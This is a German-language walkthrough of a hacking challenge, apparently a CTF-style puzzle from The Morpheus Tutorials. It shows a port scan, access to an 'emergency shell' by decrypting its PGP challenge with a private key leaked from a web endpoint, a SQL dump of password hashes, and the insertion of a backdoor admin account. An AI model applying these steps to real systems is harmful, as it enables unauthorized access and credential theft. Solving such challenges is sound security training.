# Solution of [HC 0x0b](https://hc.the-morpheus.de/0x0b.html) from [The Morpheus Tutorials](https://the-morpheus.de)

### 1. Analyse der [Webschnittstelle](http://84.200.109.239:8080)
 - Beim drücken des Login Buttons wird das eingegebene Passwort im Funktionsaufruf in base64 kodiert.
 - Schnittstelle `/getInfos` mit HTTP Methods `POST` aufrufbar um Privaten PGP Schlüssel zu erhalten.
 - Anweisungen zum Zurücksetzen des Passworts im "Reset Password Modal" 

### 2. Port der Itrago Emergency Shell herausfinden
```
$ nmap -sC the-morpheus.de

Starting Nmap 7.01 ( https://nmap.org ) at 2018-06-11 00:01 CEST
Nmap scan report for the-morpheus.de (185.244.192.170)
Host is up (0.073s latency).
Not shown: 991 filtered ports
PORT     STATE  SERVICE
... 
23/tcp   open   telnet
...
```

### 3. Auf Itrago Emergency Shell zugreifen
Mithilfe von Netcat oder Telnet auf die Shell zugreifen:
```
Itrago WebTool Emergency Access Shell
Please decrypt the following message to verify that you are the Administrator (itragoadmin@hc.the-morpheus.de)!
Encrypted Message:
-----BEGIN PGP MESSAGE-----

hQEMA/2xjz5/xxcJAQf9GRYhh3ZFZuV562xkkpEpi4qWjf83l2J9atSYSbrMsEOk
WxbyukwP2lYAMZdMd0P4TGGryObZQ5SabdY10LZpsKEfXoc83sTBNtxOT9zYaz7F
T7Qb+WQQy6fIEbaJB2O4IOdvh7inU1BldQ47sJWiN0pvPOnllrDATnLxiWrNoZlP
T/jPIXfgUtgwxXoIVHfYaABNwZumMhwoBD8FHp9t1+oPlYkh+31JViUnVk+Gi4EK
RsLpALQJMZjVDPm+5CCOcbSwtWJOA0crsevUcK+oOoj1Rk2YN3kYm9T+UHzsvj81
rx8WnNkyVIKhFVK7iY11n2IIF1NCoFdGsIqbZClmzNJKAbe2RPmZWp98njRCr6oN
cSs5qooNMHcHULckD3hUZzmGciMTZIB1BQTO/BuUFbflAjnzTZTHtin2FarqgVm6
Ygt9deviu4gcizQ=
=mP9G
-----END PGP MESSAGE-----

Message: 
```

### 4. PGP Nachicht entschlüsseln
Für die Entschlüsselung der PGP Message benötigen sie den PGP Private Key. Diesen können Sie über die `/getInfos` Schnittstelle erhalten. Beachten Sie, dass sich die Message bei jedem aufruf der Shell ändert. 

### 4. PGP Nachicht [entschlüsseln](https://www.igolder.com/PGP/decryption/) und eingeben
```
Message: 925014327749676

Emergency Shell Access Granted
$ help
Helppage
<SQL Query>   - Execute an SQL query
exit          - Quit the emergency shell
quit          - Quit the emergency shell
copyright     - Show the copyright informations
help          - Show this helppage
```

### 5. Datenbankschema verstehen
```
$ SHOW TABLES;
[{'Tables_in_hc': 'itrago'}, {'Tables_in_hc': 'umfrage'}, {'Tables_in_hc': 'users'}]
$ SELECT * FROM itrago;
[{'password': '0d1e46a9bc407c2601969ac20b7a9d0f8da1a8b0', 'username': 'itrago', 'id': 1},
 {'password': '504e73cf0aede565e54e1e9957960e3f0451ca9c', 'username': 'administrator', 'id': 2},
 {'password': '5d4c23967dbb4f75e6fe42dffd45489fb46ab9ce', 'username': 'support', 'id': 3},
 {'password': '40a2eb7c7f7300014012420c39e6fbedc75eeab2', 'username': 'praktikant', 'id': 4},
  ...]
```

Aufgrund der Passwortlänge kam man herausfinden, das für Passwörter das Hashverfahren [sha1](http://www.sha1generator.de) verwendetet wurde.

### 6. Mithilfe von SQL Befehlen einen Benutzer anlegen 
Dabei ist zu beachten, dass das Passwort mit einem Klick auf Login beim Login enkodiert wird. Dies kann entweder beim anlegen beachtet werden, alternativ kann die Funktion zum base64 Encoden aus dem HTML Code entfernt werden.

```
sha1(base64(admin)) == f5c828ff122cd8d0509051584236cceb28c78bfa
```

```
$ INSERT INTO itrago(username, password) VALUES ('admin', 'f5c828ff122cd8d0509051584236cceb28c78bfa');
Okay, last inserted id: 314181
```

Nun kann man sich mit dem Benutzername `admin` und dem Passwort `admin` im Itrago WebTool anmelden.
